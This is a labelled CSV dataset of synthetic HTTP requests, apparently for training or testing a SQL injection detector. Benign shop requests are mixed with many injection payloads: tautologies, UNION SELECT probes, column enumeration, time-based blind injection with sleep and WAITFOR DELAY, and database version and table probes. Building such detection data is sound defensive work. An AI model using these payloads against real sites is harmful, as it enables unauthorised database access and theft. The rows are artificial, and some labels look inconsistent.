text,flow_duration,label
GET /user/profile?user_id=' OR '1'='1,3508,1
"POST /api/v1/cart/add {'item_id': '2455', 'quantity': 2}",133794,0
GET /search?q=105-1,13198,1
GET /admin/login?user=smith' OR '1'='1,419,1
GET /products/electronics/D,95013,0
POST /search {'keyword': '' OR 'x'='x'},4309,1
POST /search {'keyword': '' or 1=1 limit 1 --'},7537,1
POST /profile/update {'email': 'test.user@example.com'},142495,0
GET /products/details?productID=O,76211,0
POST /search {'keyword': '' OR 1 -- -'},2753,1
GET /blog/posts?page=12,26569,0
"POST /api/v1/cart/add {'item_id': '5473', 'quantity': 5}",146188,0
"POST /login {'user': 'B', 'pass': 'password123'}",55064,0
"POST /login {'user': 'J', 'pass': 'password123'}",1998,0
GET /products/details?productID=user1' or 1=1 --,29714,1
GET /items/show.php?id=1*1,145794,1
GET /assets/css/main.css,64573,0
POST /search {'keyword': '1' ORDER BY 1--+'},16991,1
"POST /login.php {'username': ''', 'password': 'password'}",2606,1
GET /images/products/4.jpg,54731,0
GET /items/show.php?id=105-1,4012,1
GET /search.aspx?q=smith' OR '1'='1,94775,1
"POST /login {'user': 'd', 'pass': 'password123'}",69576,0
GET /products/details?productID=' OR '1'='1,5902,1
GET /products/details?productID=F,65611,0
GET /blog/posts?page=5,29500,0
GET /api/v1/users?id=1=1,4069,1
GET /api/v1/users?id=5355,149950,0
GET /index.php?page=OR+%271%27%3D%271,110335,1
"POST /api/v1/cart/add {'item_id': '1605', 'quantity': 4}",41954,0
GET /search?q=' OR 'x'='x,2658,1
GET /search?q=/,2984,1
"POST /api/v1/cart/add {'item_id': '5986', 'quantity': 1}",54793,0
GET /search.aspx?q=' OR '1'='1,3122,1
GET /assets/css/main.css,71665,0
"POST /login {'user': 'O', 'pass': 'password123'}",41149,0
"POST /api/v1/cart/add {'item_id': '5708', 'quantity': 1}",61168,0
GET /images/products/h.jpg,3570,0
GET /assets/css/main.css,117762,0
"POST /login {'user': 'T', 'pass': 'password123'}",29641,0
GET /search?q=5,14015,0
POST /search {'keyword': '' OR 1=1--'},26349,1
GET /blog/posts?page=6,118373,0
GET /user/profile?user_id=105-1,129904,1
GET /blog/posts?page=11,32627,0
"GET /api/v1/users?id=-1 UNION SELECT 1 INTO @,@",3350,1
"POST /login {'user': '' OR '' = '', 'pass': 'password123'}",45395,1
GET /products/details?productID=1 AND 1=1,142419,1
"GET /products/details?productID=' AND MID(VERSION(),1,1) = '5';",145296,1
POST /profile/update {'email': 'test.user@example.com'},70869,0
GET /assets/css/main.css,9763,0
GET /api/v1/users?id=643,72815,0
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",263,1
GET /search?q=OR '1'='1',1606,1
POST /profile/update {'email': 'test.user@example.com'},17804,0
GET /api/v1/users?id=1024-2,1601,1
GET /assets/css/main.css,70821,0
GET /products/details?productID=t,38702,0
GET /products/details?productID=A,106877,0
GET /index.php?page=AND true,68854,1
GET /api/v1/users?id=8295,36206,0
GET /products/details?productID=n,124500,0
GET /api/v1/users?id=9145,67171,0
GET /search?q=2,24249,0
"POST /login {'user': '1*56', 'pass': 'password123'}",53443,1
GET /api/v1/users?id=' OR 1=1 /*,137397,1
GET /products/details?productID=d,134078,0
GET /api/v1/users?id=1-true,48224,1
GET /products/details?productID=e,85504,0
GET /search?q=-- or #,56467,1
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",129297,1
"POST /login {'user': 'f', 'pass': 'password123'}",87610,0
GET /search.aspx?q=' OR 'x'='x,36157,1
GET /search?q=1,23145,0
"POST /login {'user': '' AND user IS NULL; --', 'pass': 'password123'}",3383,1
GET /assets/css/main.css,79050,0
GET /search?q=c,77901,0
GET /images/products/Z.jpg,117483,0
"GET /admin/login?user="" OR """" = """,72399,1
GET /user/profile?user_id=' OR '1,1505,1
GET /products/details?productID=OR+%271%27%3D%271,126233,1
"POST /api/v1/cart/add {'item_id': '4098', 'quantity': 3}",103379,0
GET /index.php?page=' UNION SELECT sum(columnname) from tablename --,1828,1
GET /index.php?page=AND true,93568,1
"GET /api/v1/users?id=' or """,2021,1
"POST /login.php {'username': '' OR 'x'='x', 'password': 'password'}",7317,1
GET /user/profile?user_id=smith' OR '1'='1,29782,1
GET /api/v1/users?id=7210,87246,0
"GET /search?q=,(select * from (select(sleep(10)))a)",27720,1
GET /assets/css/main.css,69875,0
GET /search?q=R,103549,0
GET /products/details?productID=d,18013,0
GET /blog/posts?page=15,54814,0
"POST /login {'user': 'D', 'pass': 'password123'}",84944,0
GET /assets/css/main.css,118468,0
GET /api/v1/users?id=6891,50256,0
"GET /items/show.php?id=1' GROUP BY 1,2,3--+",5675,1
GET /admin/login?user=' OR 1=1--,147091,1
GET /products/details?productID=r,38069,0
"POST /api/v1/cart/add {'item_id': '4223', 'quantity': 3}",8469,0
"POST /api/v1/cart/add {'item_id': '6196', 'quantity': 5}",21733,0
GET /admin/login?user=' OR 1=1 /*,134486,1
GET /search?q=B,30057,0
GET /index.php?page=x' or 1=1--,1660,1
GET /images/products/k.jpg,7338,0
GET /blog/posts?page=14,74115,0
"POST /api/v1/cart/add {'item_id': '9899', 'quantity': 5}",40482,0
GET /products/details?productID=' OR 1=1--,4394,1
POST /search {'keyword': 'OR '1'='1''},4639,1
GET /assets/css/main.css,43977,0
"POST /login {'user': 'K', 'pass': 'password123'}",114517,0
GET /api/v1/users?id=9451,43961,0
"POST /api/v1/cart/add {'item_id': '3652', 'quantity': 4}",23690,0
GET /images/products/S.jpg,120262,0
GET /products/details?productID=OR+%271%27%3D%271,6887,1
GET /api/v1/users?id=4080,63286,0
GET /index.php?page='admin'--,75200,1
POST /profile/update {'email': 'test.user@example.com'},36535,0
"POST /login {'user': '1024-2', 'pass': 'password123'}",125431,1
"POST /login {'user': '105-1', 'pass': 'password123'}",2740,1
"POST /login.php {'username': '1' GROUP BY 1,2,--+', 'password': 'password'}",238,1
GET /assets/css/main.css,39534,0
GET /products/details?productID=D,88640,0
GET /api/v1/users?id='''''''''''''UNION SELECT '2,34404,1
GET /api/v1/users?id=AND 0,25427,1
GET /user/profile?user_id=' OR '' = ',132686,1
POST /profile/update {'email': 'test.user@example.com'},74797,0
"POST /api/v1/cart/add {'item_id': '7015', 'quantity': 1}",69873,0
GET /images/products/k.jpg,107566,0
POST /search {'keyword': '1' and '1'='1'},7672,1
GET /search.aspx?q=' OR '1'='1,7785,1
"POST /login {'user': '' OR 1=1--', 'pass': 'password123'}",135045,1
GET /admin/login?user=1 AND (SELECT * FROM Users) = 1,140051,1
GET /search?q=p,79405,0
GET /blog/posts?page=2,16508,0
GET /search?q=u,35331,0
"POST /login {'user': 'k', 'pass': 'password123'}",59360,0
GET /products/electronics/4,66086,0
GET /search?q='admin'--,432,1
GET /search?q=z,40297,0
POST /profile/update {'email': 'test.user@example.com'},116141,0
GET /products/details?productID=105-1,106350,1
GET /blog/posts?page=2,11423,0
GET /blog/posts?page=8,57137,0
GET /products/details?productID=1' OR '1'='1' --,3911,1
GET /index.php?page=105-1,115316,1
GET /search?q=y,128096,0
POST /search {'keyword': '1*1'},3659,1
GET /products/details?productID=a,18586,0
GET /search?q=105-1,1305,1
GET /search?q=1' and '1'='1,5652,1
"POST /login {'user': 'D', 'pass': 'password123'}",53913,0
"POST /login {'user': '' OR '1'='1', 'pass': 'password123'}",596,1
POST /search {'keyword': '-2'},33649,1
POST /search {'keyword': '' AND user IS NULL; --'},10061,1
"POST /api/v1/cart/add {'item_id': '7542', 'quantity': 3}",53042,0
GET /assets/css/main.css,131920,0
POST /profile/update {'email': 'test.user@example.com'},39803,0
POST /profile/update {'email': 'test.user@example.com'},104949,0
GET /admin/login?user=AND 0,6768,1
GET /products/details?productID=AND 0,15791,1
POST /profile/update {'email': 'test.user@example.com'},39815,0
GET /search?q=x,120631,0
POST /profile/update {'email': 'test.user@example.com'},6903,0
"POST /login {'user': 'T', 'pass': 'password123'}",67592,0
POST /profile/update {'email': 'test.user@example.com'},22682,0
"POST /login {'user': '105-1', 'pass': 'password123'}",1100,1
GET /admin/login?user=OR+%271%27%3D%271,1667,1
GET /products/details?productID=Y,17074,0
"GET /search.aspx?q=1' ORDER BY 1,2--+",133634,1
GET /index.php?page=user1' or 1=1 --,4424,1
"POST /login {'user': 'OR '1'='1'', 'pass': 'password123'}",133496,1
POST /profile/update {'email': 'test.user@example.com'},58165,0
POST /profile/update {'email': 'test.user@example.com'},35515,0
GET /index.php?page=/,4901,1
"POST /login {'user': '' or 1=1 limit 1 --', 'pass': 'password123'}",74032,1
GET /api/v1/users?id=8027,134198,0
GET /api/v1/users?id=user1' or 1=1 --,4828,1
GET /user/profile?user_id=AND false,51309,1
"POST /api/v1/cart/add {'item_id': '9471', 'quantity': 1}",2735,0
GET /search?q=' or 1=1 limit 1 --,3485,1
GET /search.aspx?q=1' and '1'='1,36186,1
GET /admin/login?user=``,95813,1
GET /products/details?productID=' OR 1 -- -,69440,1
GET /search?q=OR+%271%27%3D%271,7743,1
GET /products/details?productID=F,32991,0
GET /index.php?page=' OR 1=1--,130429,1
"GET /products/details?productID=' or """,1925,1
GET /search.aspx?q=OR+%271%27%3D%271,2607,1
GET /products/books/i,24027,0
GET /products/details?productID=' or 'x'='x,49447,1
GET /api/v1/users?id=1024-2,2179,1
GET /api/v1/users?id=431,121971,0
GET /products/details?productID=D,57349,0
GET /search?q=e,124385,0
GET /api/v1/users?id=1419,58638,0
GET /blog/posts?page=12,70884,0
GET /api/v1/users?id=admin' #,129361,1
GET /images/products/8.jpg,34019,0
"POST /login {'user': '1', 'pass': 'password123'}",90956,0
GET /index.php?page=105-1,92427,1
POST /search {'keyword': '1 AND 1=1'},5395,1
"POST /api/v1/cart/add {'item_id': '9713', 'quantity': 3}",107959,0
GET /index.php?page=' AND user IS NULL; --,2351,1
GET /search?q=U,31233,0
GET /search?q=' OR 1=1 /*,125095,1
GET /search?q=\,6183,1
GET /api/v1/users?id=1024-2,141467,1
GET /products/details?productID=r,72602,0
GET /products/details?productID=B,68165,0
GET /products/details?productID=e,74425,0
GET /user/profile?user_id=/,76449,1
"POST /api/v1/cart/add {'item_id': '9482', 'quantity': 5}",128522,0
GET /products/details?productID=n,58820,0
GET /search.aspx?q=' AND user IS NULL; --,55441,1
"GET /index.php?page="" OR 1 = 1 -- -",3040,1
GET /products/details?productID=L,51197,0
GET /search?q=s,33420,0
GET /products/details?productID=5,43280,0
GET /index.php?page=1=1,5153,1
"POST /login {'user': '' OR 'x'='x', 'pass': 'password123'}",143677,1
"POST /login {'user': 'j', 'pass': 'password123'}",4155,0
GET /api/v1/users?id=' OR '1'='1,95941,1
"POST /api/v1/cart/add {'item_id': '6151', 'quantity': 3}",60721,0
GET /images/products/7.jpg,33557,0
GET /search?q=O,80303,0
"POST /login {'user': 'Z', 'pass': 'password123'}",92076,0
GET /products/details?productID=OR '1'='1',85961,1
GET /admin/login?user=1024-2,83582,1
POST /search {'keyword': '' OR '1'='1'},89918,1
GET /api/v1/users?id=smith' OR '1'='1,7448,1
GET /api/v1/users?id=7066,58538,0
GET /api/v1/users?id=' AND user IS NULL; --,7456,1
POST /profile/update {'email': 'test.user@example.com'},90702,0
GET /assets/css/main.css,64365,0
GET /api/v1/users?id=1' OR '1'='1' --,144873,1
GET /api/v1/users?id=/*…*/,125941,1
GET /api/v1/users?id=\\,5298,1
GET /images/products/Z.jpg,36020,0
"GET /index.php?page=-1' UNION SELECT 1,2,3--+",41468,1
POST /profile/update {'email': 'test.user@example.com'},8328,0
GET /blog/posts?page=15,97872,0
GET /user/profile?user_id=' AND user IS NULL; --,3888,1
GET /blog/posts?page=20,134417,0
GET /search.aspx?q=' OR 1=1 /*,2143,1
GET /products/details?productID=F,86949,0
GET /products/home/V,10618,0
GET /products/details?productID=1 AND 1=1,146449,1
GET /admin/login?user=OR '1'='1',18100,1
GET /blog/posts?page=19,24423,0
GET /search?q=-- or #,1967,1
GET /index.php?page=' OR 'x'='x,6645,1
GET /assets/css/main.css,97375,0
POST /profile/update {'email': 'test.user@example.com'},63584,0
POST /profile/update {'email': 'test.user@example.com'},55437,0
GET /admin/login?user=//,91452,1
GET /products/details?productID=' OR 'x'='x,3786,1
GET /images/products/h.jpg,68910,0
GET /products/details?productID='admin'--,123935,1
GET /search?q=' OR 1=1 /*,52441,1
GET /user/profile?user_id=1024-2,77345,1
GET /products/details?productID=1' and '1'='1,675,1
GET /items/show.php?id=1*1,105884,1
"POST /login {'user': 'c', 'pass': 'password123'}",76564,0
GET /search?q=1=1,70131,1
"POST /login {'user': 'T', 'pass': 'password123'}",149879,0
"GET /user/profile?user_id=' or """,7813,1
GET /index.php?page=1' OR '1'='1' --,87746,1
POST /search {'keyword': '' or 1=1 limit 1 --'},6107,1
GET /products/details?productID=X,95289,0
"POST /login {'user': '9', 'pass': 'password123'}",16897,0
GET /products/details?productID=1' OR '1'='1' --,4435,1
"POST /login.php {'username': '' OR 1=1 /*', 'password': 'password'}",3274,1
GET /search?q=OR '1'='1',63465,1
GET /search?q='=0--+,144169,1
GET /products/details?productID='=0--+,67863,1
GET /search?q=1,30992,0
GET /products/details?productID=B,30107,0
"GET /search.aspx?q=,",54333,1
GET /search?q=d,147442,0
"POST /login {'user': 's', 'pass': 'password123'}",39374,0
"POST /login {'user': '1=1', 'pass': 'password123'}",6708,1
GET /images/products/i.jpg,134354,0
"POST /login {'user': '1 AND 1=1', 'pass': 'password123'}",2441,1
"POST /login {'user': 'W', 'pass': 'password123'}",30145,0
GET /api/v1/users?id=2526,40886,0
GET /admin/login?user=1 AND 1=1,7360,1
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",2093,1
GET /api/v1/users?id=' OR '' = ',147995,1
POST /profile/update {'email': 'test.user@example.com'},100572,0
GET /images/products/E.jpg,28672,0
GET /index.php?page=' OR '1'='1,77596,1
GET /admin/login?user=' OR '1,118991,1
GET /api/v1/users?id=4455,25092,0
GET /products/details?productID=1' ORDER BY 1--+,30773,1
GET /blog/posts?page=2,26011,0
"POST /login {'user': 'R', 'pass': 'password123'}",6361,0
"GET /search?q="" OR 1 = 1 -- -",112035,1
"GET /user/profile?user_id=""""",5163,1
GET /blog/posts?page=5,54479,0
GET /api/v1/users?id=3884,49777,0
GET /search?q=J,86046,0
GET /search.aspx?q=' or 'x'='x,80519,1
POST /search {'keyword': '' OR 1=1 /*'},7514,1
GET /assets/css/main.css,78326,0
"POST /login.php {'username': '//', 'password': 'password'}",102684,1
GET /products/details?productID=' OR 1=1--,45453,1
"POST /api/v1/cart/add {'item_id': '2868', 'quantity': 5}",27412,0
"POST /login {'user': 'n', 'pass': 'password123'}",38292,0
GET /api/v1/users?id=``,92102,1
"POST /login {'user': '''', 'pass': 'password123'}",4987,1
GET /search?q=M,87250,0
GET /search?q=%2c(select%20*%20from%20(select(sleep(10)))a),76533,1
GET /products/home/g,144879,0
GET /products/details?productID=OR '1'='1',4158,1
GET /search?q=D,13201,0
"POST /login {'user': '1*1', 'pass': 'password123'}",91333,1
POST /search {'keyword': '1-true'},103444,1
"POST /login {'user': 'l', 'pass': 'password123'}",4109,0
"POST /login {'user': '""""', 'pass': 'password123'}",2861,1
GET /index.php?page=';WAITFOR DELAY '0:0:30'--,615,1
GET /api/v1/users?id=' or 1=1 limit 1 --,38085,1
GET /search?q=' or 'x'='x,10545,1
"POST /login {'user': 'q', 'pass': 'password123'}",27067,0
POST /profile/update {'email': 'test.user@example.com'},68677,0
GET /assets/css/main.css,71770,0
"POST /login.php {'username': 'user1' or 1=1 --', 'password': 'password'}",139670,1
"GET /items/show.php?id=1' GROUP BY 1,2,--+",131173,1
GET /api/v1/users?id=8605,56034,0
GET /admin/login?user=' UNION SELECT sum(columnname) from tablename --,1330,1
GET /images/products/z.jpg,9366,0
GET /api/v1/users?id=user1' or 1=1 --,3815,1
GET /search?q=l,52667,0
"POST /api/v1/cart/add {'item_id': '4312', 'quantity': 5}",117518,0
GET /blog/posts?page=3,101259,0
"POST /api/v1/cart/add {'item_id': '5920', 'quantity': 3}",29014,0
GET /api/v1/users?id=4022,136385,0
GET /search?q=Z,87828,0
POST /search {'keyword': '1*1'},325,1
POST /search {'keyword': ''''''''''''''UNION SELECT '2'},6052,1
"POST /search {'keyword': ','}",3288,1
GET /products/books/b,42462,0
GET /search?q=x' or 1=1--,135668,1
GET /products/details?productID=OR+%271%27%3D%271,101703,1
GET /api/v1/users?id=8721,89259,0
GET /products/books/i,96533,0
GET /images/products/K.jpg,5049,0
GET /products/details?productID=U,28463,0
GET /blog/posts?page=6,77808,0
GET /products/home/v,15408,0
"POST /login {'user': 'T', 'pass': 'password123'}",5429,0
GET /items/show.php?id=AND 0,36179,1
GET /admin/login?user=``,33928,1
GET /items/show.php?id=OR+%271%27%3D%271,13852,1
POST /search {'keyword': 'smith' OR '1'='1'},69579,1
POST /search {'keyword': '1024-2'},4136,1
"POST /login {'user': 'h', 'pass': 'password123'}",47198,0
"POST /login {'user': 'OR '1'='1'', 'pass': 'password123'}",5069,1
GET /assets/css/main.css,23087,0
GET /images/products/a.jpg,81243,0
GET /api/v1/users?id=' OR 1=1 /*,2315,1
GET /items/show.php?id=OR+%271%27%3D%271,3989,1
GET /products/details?productID=C,65800,0
GET /products/details?productID=AND 0,669,1
GET /index.php?page=' or 'x'='x,3850,1
GET /products/details?productID=p,107058,0
GET /images/products/p.jpg,59714,0
GET /user/profile?user_id=OR+%271%27%3D%271,3224,1
GET /products/details?productID=a,14858,0
"POST /login {'user': '1024-2', 'pass': 'password123'}",3034,1
GET /search?q=c,53804,0
"POST /login {'user': 'h', 'pass': 'password123'}",47272,0
"GET /items/show.php?id=""""",4339,1
GET /api/v1/users?id=1976,62774,0
POST /profile/update {'email': 'test.user@example.com'},74945,0
"POST /login {'user': '1*1', 'pass': 'password123'}",2915,1
GET /api/v1/users?id=1=1,3894,1
GET /assets/css/main.css,44363,0
GET /api/v1/users?id=' OR '' = ',131093,1
"POST /login {'user': '9', 'pass': 'password123'}",73588,0
GET /search?q=OR '1'='1',52274,1
GET /images/products/D.jpg,108178,0
GET /products/details?productID=1' ORDER BY 3--+,7367,1
GET /api/v1/users?id=8870,72170,0
"POST /login {'user': '1=1', 'pass': 'password123'}",732,1
"POST /login {'user': '9', 'pass': 'password123'}",82773,0
GET /products/electronics/o,50785,0
GET /api/v1/users?id=5659,15096,0
GET /assets/css/main.css,31097,0
GET /admin/login?user=1 AND 1=1,6118,1
"POST /login {'user': '' AND user IS NULL; --', 'pass': 'password123'}",5350,1
GET /api/v1/users?id=1953,14481,0
GET /search?q=T,133535,0
"POST /login {'user': '1*1', 'pass': 'password123'}",89287,1
GET /products/details?productID=-2,149841,1
GET /images/products/b.jpg,48046,0
"POST /login {'user': '/', 'pass': 'password123'}",149635,1
GET /admin/login?user=user1' or 1=1 --,191,1
"POST /login {'user': '' AND user IS NULL; --', 'pass': 'password123'}",108319,1
"GET /admin/login?user=' AND MID(VERSION(),1,1) = '5';",449,1
GET /user/profile?user_id=105-1,2555,1
GET /api/v1/users?id=x' or 1=1--,7126,1
GET /search?q=O,77524,0
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",45469,1
GET /assets/css/main.css,267,0
GET /products/details?productID=' OR 1=1--,10279,1
GET /search?q=' OR 1=1--,5417,1
GET /assets/css/main.css,7720,0
GET /index.php?page=1 AND 1=1,2532,1
POST /search {'keyword': '' or 'x'='x'},91264,1
GET /images/products/b.jpg,45735,0
GET /search?q=1' OR '1'='1' --,18521,1
GET /api/v1/users?id=%2c(select%20*%20from%20(select(sleep(10)))a),17582,1
"POST /login {'user': 'm', 'pass': 'password123'}",146797,0
GET /products/books/B,13310,0
"POST /login {'user': '1024-2', 'pass': 'password123'}",4155,1
GET /images/products/L.jpg,44745,0
"POST /login {'user': 'H', 'pass': 'password123'}",63830,0
"POST /login {'user': '1024-2', 'pass': 'password123'}",44220,1
POST /search {'keyword': '' OR '' = ''},6064,1
GET /products/details?productID=' OR '1'='1,912,1
GET /assets/css/main.css,100255,0
"POST /login {'user': 'g', 'pass': 'password123'}",94467,0
GET /search?q=2,39994,0
GET /admin/login?user=' or 1=1 limit 1 --,6767,1
POST /profile/update {'email': 'test.user@example.com'},50611,0
GET /blog/posts?page=3,84191,0
"POST /login {'user': ''admin'--', 'pass': 'password123'}",47283,1
GET /blog/posts?page=3,35047,0
"POST /login.php {'username': '' or 1=1 limit 1 --', 'password': 'password'}",7975,1
GET /products/books/7,22168,0
"POST /login.php {'username': '' or 'x'='x', 'password': 'password'}",1671,1
GET /search?q=j,31984,0
GET /products/details?productID=d,82151,0
GET /index.php?page=1 AND 1=1,6311,1
POST /profile/update {'email': 'test.user@example.com'},19786,0
GET /products/details?productID=e,93852,0
GET /search?q=admin' #,3144,1
GET /search.aspx?q='admin'--,79102,1
"GET /api/v1/users?id=""""",5649,1
"POST /login {'user': 'r', 'pass': 'password123'}",23706,0
GET /admin/login?user=1' OR '1'='1' --,4120,1
GET /search?q=a,25938,0
GET /products/details?productID=1 AND 1=1,7286,1
"POST /login {'user': 'z', 'pass': 'password123'}",61118,0
GET /index.php?page=' or 1=1 limit 1 --,1229,1
GET /search.aspx?q=1' and '1'='1,117262,1
"POST /api/v1/cart/add {'item_id': '7661', 'quantity': 3}",80208,0
GET /api/v1/users?id=//,1345,1
GET /images/products/r.jpg,17270,0
"POST /login {'user': '1 AND 1=1', 'pass': 'password123'}",3856,1
GET /api/v1/users?id=x' or 1=1--,2144,1
GET /search?q=-2,7925,1
"POST /login.php {'username': '1' ORDER BY 2--+', 'password': 'password'}",6188,1
GET /blog/posts?page=3,54348,0
GET /search?q=Z,62203,0
GET /search?q=7,11542,0
GET /blog/posts?page=13,71688,0
GET /api/v1/users?id=3275,37791,0
POST /profile/update {'email': 'test.user@example.com'},86756,0
"POST /login.php {'username': 'AND false', 'password': 'password'}",66708,1
GET /items/show.php?id=' or 1=1 limit 1 --,7687,1
GET /api/v1/users?id=2357,14518,0
POST /search {'keyword': '' OR 1=1 /*'},3255,1
POST /profile/update {'email': 'test.user@example.com'},36113,0
GET /products/details?productID=3,87682,0
GET /images/products/1.jpg,43973,0
GET /api/v1/users?id=' OR '1'='1,4689,1
GET /products/details?productID=N,34422,0
GET /products/details?productID=smith' OR '1'='1,1270,1
"POST /login {'user': 'q', 'pass': 'password123'}",29034,0
"POST /login {'user': '' or 1=1 limit 1 --', 'pass': 'password123'}",3534,1
"POST /login.php {'username': '-- or #', 'password': 'password'}",112708,1
GET /search?q=Q,50739,0
GET /search.aspx?q=' OR 'x'='x,3725,1
GET /assets/css/main.css,112091,0
GET /images/products/j.jpg,89700,0
GET /images/products/U.jpg,83747,0
"POST /api/v1/cart/add {'item_id': '1204', 'quantity': 3}",7761,0
GET /search?q=1' OR '1'='1' --,75771,1
"POST /api/v1/cart/add {'item_id': '7442', 'quantity': 4}",97689,0
"POST /api/v1/cart/add {'item_id': '2872', 'quantity': 5}",55824,0
GET /products/details?productID=R,42109,0
"POST /login {'user': '1' and '1'='1', 'pass': 'password123'}",4170,1
GET /search?q=J,26399,0
"GET /index.php?page=1' ORDER BY 1,2,3--+",1019,1
POST /profile/update {'email': 'test.user@example.com'},30277,0
GET /images/products/r.jpg,17607,0
GET /products/books/4,73390,0
GET /search?q=d,58124,0
GET /products/books/M,46334,0
GET /search?q=1=1,5301,1
GET /search?q=' OR 'x'='x,117450,1
GET /assets/css/main.css,89486,0
"POST /login {'user': 'h', 'pass': 'password123'}",31977,0
GET /search?q=T,27920,0
GET /api/v1/users?id=7290,42970,0
GET /blog/posts?page=14,147475,0
GET /products/details?productID=user1' or 1=1 --,7771,1
GET /products/details?productID=b,80710,0
GET /products/books/u,82787,0
GET /products/details?productID=5,18343,0
GET /products/details?productID=Y,63410,0
GET /search?q=' or 'x'='x,6445,1
GET /api/v1/users?id=5151,59039,0
"POST /login {'user': 'U', 'pass': 'password123'}",82434,0
GET /search.aspx?q=' OR 1=1--,48616,1
GET /products/details?productID=' OR 'x'='x,1027,1
POST /search {'keyword': ''admin'--'},6408,1
"GET /search.aspx?q=,(select * from (select(sleep(10)))a)",2626,1
"POST /login {'user': '5', 'pass': 'password123'}",42830,0
GET /products/books/s,58633,0
"POST /login {'user': '/', 'pass': 'password123'}",1073,1
GET /images/products/B.jpg,34569,0
"POST /api/v1/cart/add {'item_id': '4309', 'quantity': 2}",29717,0
"POST /login {'user': 'P', 'pass': 'password123'}",149822,0
"POST /login {'user': 'user1' or 1=1 --', 'pass': 'password123'}",119115,1
GET /products/electronics/H,85735,0
"POST /api/v1/cart/add {'item_id': '1406', 'quantity': 3}",140913,0
GET /admin/login?user=' OR '1'='1,6815,1
GET /assets/css/main.css,34888,0
"POST /login {'user': '' OR 'x'='x', 'pass': 'password123'}",964,1
GET /search?q=1' and '1'='1,396,1
POST /profile/update {'email': 'test.user@example.com'},58115,0
GET /items/show.php?id=1 AND 1=1,4436,1
GET /products/details?productID=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,2602,1
GET /search?q=smith' OR '1'='1,95051,1
GET /search?q=' OR 1=1 /*,92429,1
GET /api/v1/users?id='admin'--,5635,1
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",7790,1
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",49335,1
GET /api/v1/users?id=1244,6154,0
GET /assets/css/main.css,91433,0
GET /blog/posts?page=17,77056,0
GET /api/v1/users?id=6783,61738,0
GET /products/details?productID=s,48284,0
"POST /login {'user': 'y', 'pass': 'password123'}",10314,0
GET /products/details?productID=e,108830,0
GET /search?q=K,47346,0
GET /api/v1/users?id=1215,6004,0
GET /search?q=-- or #,4802,1
GET /search?q=G,80930,0
"POST /login.php {'username': 'admin' #', 'password': 'password'}",145190,1
POST /profile/update {'email': 'test.user@example.com'},42804,0
GET /products/details?productID=-- or #,2696,1
GET /assets/css/main.css,53469,0
GET /search?q=7,51971,0
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",929,1
GET /api/v1/users?id=105-1,3632,1
GET /images/products/q.jpg,74663,0
GET /products/details?productID=D,73487,0
GET /search?q=' OR '1'='1,2033,1
"POST /api/v1/cart/add {'item_id': '7249', 'quantity': 1}",70653,0
GET /images/products/i.jpg,86581,0
GET /admin/login?user=' or 1=1 limit 1 --,90676,1
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",7597,1
"POST /login {'user': '' AND id IS NULL; --', 'pass': 'password123'}",4009,1
GET /user/profile?user_id=//,5395,1
GET /search.aspx?q=' OR 1=1--,4509,1
GET /products/books/F,86871,0
GET /blog/posts?page=8,69518,0
GET /blog/posts?page=18,18218,0
POST /profile/update {'email': 'test.user@example.com'},83680,0
GET /api/v1/users?id=6215,11677,0
GET /search?q=' AND user IS NULL; --,763,1
"POST /login {'user': '' UNION SELECT sum(columnname) from tablename --', 'pass': 'password123'}",99844,1
GET /assets/css/main.css,19638,0
"POST /login {'user': 'm', 'pass': 'password123'}",44291,0
GET /assets/css/main.css,57396,0
GET /search?q=q,9733,0
"POST /api/v1/cart/add {'item_id': '1892', 'quantity': 2}",71137,0
GET /search.aspx?q='LIKE',27048,1
GET /api/v1/users?id=8839,81073,0
"POST /api/v1/cart/add {'item_id': '6710', 'quantity': 3}",47020,0
GET /search?q=1*1,72032,1
GET /products/details?productID=z,31071,0
GET /search?q=smith' OR '1'='1,1765,1
POST /profile/update {'email': 'test.user@example.com'},78800,0
GET /index.php?page=' OR '1'='1,6221,1
GET /search?q=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,134417,1
"POST /login {'user': '/*…*/', 'pass': 'password123'}",25060,1
GET /items/show.php?id=1024-2,114070,1
GET /search.aspx?q=' AND user IS NULL; --,46064,1
